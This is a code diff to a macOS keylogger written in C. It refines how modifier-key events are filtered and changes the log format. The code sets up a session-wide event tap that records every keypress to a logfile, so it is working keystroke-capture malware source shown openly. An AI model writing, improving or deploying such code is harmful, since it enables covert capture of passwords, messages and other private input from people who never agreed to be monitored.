@@ -1,15 +1,17 @@
 #include "keylogger.h"
 
+int keyCodeCache[127];
+
 int main(int argc, const char *argv[]) {
 
     // Create an event tap to retrieve keypresses.
-    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
+    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
     CFMachPortRef eventTap = CGEventTapCreate(
         kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
     );
 
     // Exit the program if unable to create the event tap.
-    if(!eventTap) {
+    if (!eventTap) {
         fprintf(stderr, "ERROR: Unable to create event tap.\n");
         exit(1);
     }
@@ -21,8 +23,8 @@ int main(int argc, const char *argv[]) {
 
 
     // Clear the logfile if clear argument used or log to specific file if given.
-    if(argc == 2) {
-        if(strcmp(argv[1], "clear") == 0) {
+    if (argc == 2) {
+        if (strcmp(argv[1], "clear") == 0) {
             fopen(logfileLocation, "w");
             printf("%s cleared.\n", logfileLocation);
             fflush(stdout);
@@ -55,14 +57,25 @@ int main(int argc, const char *argv[]) {
 
 // The following callback method is invoked on every keypress.
 CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }
+    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
+        return event;
+    }
 
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
+    if (type == kCGEventFlagsChanged && keyCodeCache[keyCode] == 1 && keyCode != 57) {
+        keyCodeCache[keyCode] = 0;
+        return event;
+    }
+
     // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    fprintf(logfile, "%d - %s\n", type, convertKeyCode(keyCode));
     fflush(logfile);
+
+    if (type == kCGEventFlagsChanged && keyCode != 57) {
+        keyCodeCache[keyCode] = 1;
+    }
 
     return event;
 }
